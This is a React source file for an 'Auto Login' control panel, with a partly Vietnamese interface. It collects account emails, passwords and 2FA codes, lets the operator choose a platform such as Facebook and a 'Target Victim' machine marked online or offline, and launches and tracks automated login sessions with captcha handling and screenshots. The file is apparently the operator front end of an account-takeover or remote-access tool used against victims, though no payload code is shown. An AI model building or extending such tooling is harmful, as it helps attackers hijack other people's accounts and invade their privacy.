import React, { useState } from "react";
import PropTypes from "prop-types";
import { motion } from "framer-motion";
import { Button } from "./ui/button";
import { Input } from "./ui/input";
import { Label } from "./ui/label";
import { Badge } from "./ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "./ui/card";
import {
  Play,
  Square,
  Settings,
  Eye,
  AlertCircle,
  CheckCircle,
  Clock,
  Zap,
  Shield,
} from "lucide-react";
import { PlatformUtils } from "../utils/platformManager";
import { useToast } from "./ui/use-toast";

const AutoLoginPanel = ({
  onStartLogin,
  onCancelLogin,
  currentSessions = [],
}) => {
  const [selectedPlatform, setSelectedPlatform] = useState("facebook");
  const [credentials, setCredentials] = useState({
    email: "",
    password: "",
    twoFactorCode: "",
  });
  const [selectedVictim, setSelectedVictim] = useState("");
  const [isAdvancedMode, setIsAdvancedMode] = useState(false);
  const [loginOptions, setLoginOptions] = useState({
    takeScreenshot: true,
    handleCaptcha: true,
    retryOnFailure: true,
    maxRetries: 3,
    redirectAfterLogin: "",
  });
  const { toast } = useToast();

  const platforms = PlatformUtils.getAllPlatforms();
  const selectedPlatformInfo = platforms.find((p) => p.id === selectedPlatform);

  const handleStartLogin = async () => {
    if (!credentials.email || !credentials.password) {
      toast({
        title: "❌ Missing Credentials",
        description: "Vui lòng nhập email và password",
        variant: "destructive",
      });
      return;
    }

    if (!selectedVictim) {
      toast({
        title: "❌ No Victim Selected",
        description: "Vui lòng chọn victim để thực hiện auto login",
        variant: "destructive",
      });
      return;
    }

    const loginConfig = {
      platformId: selectedPlatform,
      credentials,
      victimId: selectedVictim,
      options: loginOptions,
    };

    try {
      await onStartLogin(loginConfig);
    } catch (error) {
      toast({
        title: "❌ Login Start Failed",
        description: error.message,
        variant: "destructive",
      });
    }
  };

  const getSessionStatusBadge = (status) => {
    const statusConfig = {
      initializing: { color: "bg-blue-500/20 text-blue-400", icon: Clock },
      in_progress: { color: "bg-yellow-500/20 text-yellow-400", icon: Play },
      completed: { color: "bg-green-500/20 text-green-400", icon: CheckCircle },
      failed: { color: "bg-red-500/20 text-red-400", icon: AlertCircle },
      cancelled: { color: "bg-gray-500/20 text-gray-400", icon: Square },
    };

    const config = statusConfig[status] || statusConfig.initializing;
    const IconComponent = config.icon;

    return (
      <Badge className={`${config.color} border-0 flex items-center gap-1`}>
        <IconComponent className="w-3 h-3" />
        {status}
      </Badge>
    );
  };

  return (
    <div className="space-y-6">
      {/* Platform Selection */}
      <Card className="bg-gray-800/50 border-gray-700">
        <CardHeader>
          <CardTitle className="text-lg flex items-center gap-2">
            <Zap className="w-5 h-5 text-yellow-500" />
            Auto Login Configuration
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          {/* Platform Grid */}
          <div>
            <Label className="text-sm font-medium text-gray-300 mb-3 block">
              Chọn nền tảng:
            </Label>
            <div className="grid grid-cols-3 md:grid-cols-6 gap-3">
              {platforms.map((platform) => (
                <button
                  key={platform.id}
                  onClick={() => setSelectedPlatform(platform.id)}
                  className={`p-3 rounded-lg border transition-all duration-200 hover:scale-105 ${
                    selectedPlatform === platform.id
                      ? "border-blue-500 bg-blue-500/20"
                      : "border-gray-600 hover:border-gray-500"
                  }`}
                >
                  <div className="text-2xl mb-1">{platform.icon}</div>
                  <div className="text-xs text-gray-300">{platform.name}</div>
                </button>
              ))}
            </div>
          </div>

          {/* Selected Platform Info */}
          {selectedPlatformInfo && (
            <div className="bg-gray-700/30 rounded-lg p-4">
              <div className="flex items-center gap-3 mb-3">
                <span className="text-2xl">{selectedPlatformInfo.icon}</span>
                <div>
                  <h3 className="font-medium text-white">
                    {selectedPlatformInfo.displayName}
                  </h3>
                  <p className="text-xs text-gray-400">
                    {selectedPlatformInfo.baseUrl}
                  </p>
                </div>
              </div>
              <div className="flex flex-wrap gap-2">
                {selectedPlatformInfo.features.supports2FA && (
                  <Badge className="bg-green-500/20 text-green-400 border-0">
                    <Shield className="w-3 h-3 mr-1" />
                    2FA Support
                  </Badge>
                )}
                {selectedPlatformInfo.features.supportsCaptcha && (
                  <Badge className="bg-blue-500/20 text-blue-400 border-0">
                    <Eye className="w-3 h-3 mr-1" />
                    Captcha Handling
                  </Badge>
                )}
                {selectedPlatformInfo.features.multiStepLogin && (
                  <Badge className="bg-purple-500/20 text-purple-400 border-0">
                    Multi-Step Login
                  </Badge>
                )}
              </div>
            </div>
          )}

          {/* Credentials */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <Label
                htmlFor="email"
                className="text-sm font-medium text-gray-300"
              >
                Email/Username
              </Label>
              <Input
                id="email"
                type="email"
                placeholder="user@example.com"
                value={credentials.email}
                onChange={(e) =>
                  setCredentials((prev) => ({ ...prev, email: e.target.value }))
                }
                className="mt-1 bg-gray-700 border-gray-600 text-white"
              />
            </div>
            <div>
              <Label
                htmlFor="password"
                className="text-sm font-medium text-gray-300"
              >
                Password
              </Label>
              <Input
                id="password"
                type="password"
                placeholder="••••••••"
                value={credentials.password}
                onChange={(e) =>
                  setCredentials((prev) => ({
                    ...prev,
                    password: e.target.value,
                  }))
                }
                className="mt-1 bg-gray-700 border-gray-600 text-white"
              />
            </div>
          </div>

          {/* 2FA Code (if platform supports it) */}
          {selectedPlatformInfo?.features.supports2FA && (
            <div>
              <Label
                htmlFor="twoFactorCode"
                className="text-sm font-medium text-gray-300"
              >
                2FA Code (optional)
              </Label>
              <Input
                id="twoFactorCode"
                type="text"
                placeholder="123456"
                value={credentials.twoFactorCode}
                onChange={(e) =>
                  setCredentials((prev) => ({
                    ...prev,
                    twoFactorCode: e.target.value,
                  }))
                }
                className="mt-1 bg-gray-700 border-gray-600 text-white max-w-32"
              />
            </div>
          )}

          {/* Victim Selection */}
          <div>
            <Label
              htmlFor="victim"
              className="text-sm font-medium text-gray-300"
            >
              Target Victim
            </Label>
            <select
              id="victim"
              value={selectedVictim}
              onChange={(e) => setSelectedVictim(e.target.value)}
              className="mt-1 w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md text-white"
            >
              <option value="">Chọn victim...</option>
              <option value="VICTIM_001">VICTIM_001 (Online)</option>
              <option value="VICTIM_002">VICTIM_002 (Online)</option>
              <option value="VICTIM_003">VICTIM_003 (Offline)</option>
            </select>
          </div>

          {/* Advanced Options Toggle */}
          <div className="flex items-center gap-2">
            <input
              type="checkbox"
              id="advancedMode"
              checked={isAdvancedMode}
              onChange={(e) => setIsAdvancedMode(e.target.checked)}
              className="rounded"
            />
            <Label htmlFor="advancedMode" className="text-sm text-gray-300">
              Advanced Options
            </Label>
          </div>

          {/* Advanced Options */}
          {isAdvancedMode && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: "auto" }}
              exit={{ opacity: 0, height: 0 }}
              className="space-y-4 border-t border-gray-700 pt-4"
            >
              <div className="grid grid-cols-2 gap-4">
                <div className="flex items-center gap-2">
                  <input
                    type="checkbox"
                    id="takeScreenshot"
                    checked={loginOptions.takeScreenshot}
                    onChange={(e) =>
                      setLoginOptions((prev) => ({
                        ...prev,
                        takeScreenshot: e.target.checked,
                      }))
                    }
                    className="rounded"
                  />
                  <Label
                    htmlFor="takeScreenshot"
                    className="text-sm text-gray-300"
                  >
                    Take Screenshot
                  </Label>
                </div>
                <div className="flex items-center gap-2">
                  <input
                    type="checkbox"
                    id="handleCaptcha"
                    checked={loginOptions.handleCaptcha}
                    onChange={(e) =>
                      setLoginOptions((prev) => ({
                        ...prev,
                        handleCaptcha: e.target.checked,
                      }))
                    }
                    className="rounded"
                  />
                  <Label
                    htmlFor="handleCaptcha"
                    className="text-sm text-gray-300"
                  >
                    Handle Captcha
                  </Label>
                </div>
              </div>

              <div>
                <Label
                  htmlFor="maxRetries"
                  className="text-sm font-medium text-gray-300"
                >
                  Max Retries
                </Label>
                <Input
                  id="maxRetries"
                  type="number"
                  min="1"
                  max="5"
                  value={loginOptions.maxRetries}
                  onChange={(e) =>
                    setLoginOptions((prev) => ({
                      ...prev,
                      maxRetries: parseInt(e.target.value),
                    }))
                  }
                  className="mt-1 bg-gray-700 border-gray-600 text-white max-w-20"
                />
              </div>

              <div>
                <Label
                  htmlFor="redirectUrl"
                  className="text-sm font-medium text-gray-300"
                >
                  Redirect After Login (optional)
                </Label>
                <Input
                  id="redirectUrl"
                  type="url"
                  placeholder="https://example.com/dashboard"
                  value={loginOptions.redirectAfterLogin}
                  onChange={(e) =>
                    setLoginOptions((prev) => ({
                      ...prev,
                      redirectAfterLogin: e.target.value,
                    }))
                  }
                  className="mt-1 bg-gray-700 border-gray-600 text-white"
                />
              </div>
            </motion.div>
          )}

          {/* Action Buttons */}
          <div className="flex gap-3 pt-4">
            <Button
              onClick={handleStartLogin}
              className="bg-green-600 hover:bg-green-700 flex-1"
              disabled={
                !credentials.email || !credentials.password || !selectedVictim
              }
            >
              <Play className="w-4 h-4 mr-2" />
              Start Auto Login
            </Button>
            <Button
              onClick={() =>
                setCredentials({ email: "", password: "", twoFactorCode: "" })
              }
              variant="outline"
              className="border-gray-600"
            >
              Clear
            </Button>
            <Button
              variant="outline"
              className="border-gray-600"
              onClick={() => setIsAdvancedMode(!isAdvancedMode)}
            >
              <Settings className="w-4 h-4" />
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Current Sessions */}
      {currentSessions.length > 0 && (
        <Card className="bg-gray-800/50 border-gray-700">
          <CardHeader>
            <CardTitle className="text-lg">Active Login Sessions</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-3">
              {currentSessions.map((session) => {
                const platformInfo = PlatformUtils.getPlatformStyle(
                  session.platform
                );
                return (
                  <div
                    key={session.id}
                    className="flex items-center justify-between p-3 bg-gray-700/30 rounded-lg"
                  >
                    <div className="flex items-center gap-3">
                      <span className="text-lg">{platformInfo.icon}</span>
                      <div>
                        <div className="text-sm font-medium text-white">
                          {platformInfo.name} - {session.victimId}
                        </div>
                        <div className="text-xs text-gray-400">
                          Started:{" "}
                          {new Date(session.startTime).toLocaleTimeString(
                            "vi-VN"
                          )}
                        </div>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      {getSessionStatusBadge(session.status)}
                      {session.status === "in_progress" && (
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => onCancelLogin(session.id)}
                          className="border-red-500 text-red-400 hover:bg-red-500/20"
                        >
                          <Square className="w-3 h-3 mr-1" />
                          Cancel
                        </Button>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          </CardContent>
        </Card>
      )}
    </div>
  );
};

// PropTypes validation
AutoLoginPanel.propTypes = {
  onStartLogin: PropTypes.func.isRequired,
  onCancelLogin: PropTypes.func.isRequired,
  currentSessions: PropTypes.array,
};

AutoLoginPanel.defaultProps = {
  currentSessions: [],
};

export default AutoLoginPanel;
